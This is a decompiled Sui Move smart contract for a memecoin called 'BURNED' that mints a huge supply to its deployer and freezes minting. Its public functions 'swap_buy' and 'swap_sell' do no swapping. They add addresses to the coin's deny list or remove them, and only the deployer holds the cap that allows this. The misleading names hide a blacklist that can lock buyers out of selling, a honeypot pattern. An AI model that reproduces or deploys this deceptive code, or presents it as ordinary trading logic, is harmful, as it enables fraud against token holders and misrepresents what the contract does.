module 0x74a732bb6e65c060d7c288c932d81415ccecbc12a89f38848adf03d8e39d355d::burned {
    struct BURNED has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BURNED, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BURNED>(arg0, 9, b"BURNED", b"Justice For Monkeys", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYjAdhMAmx7ueaVHBx3Eu6ZHrie5BBgbGF9jE9tai4gFM"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BURNED>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BURNED>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BURNED>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BURNED>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BURNED>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BURNED>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BURNED>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BURNED>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

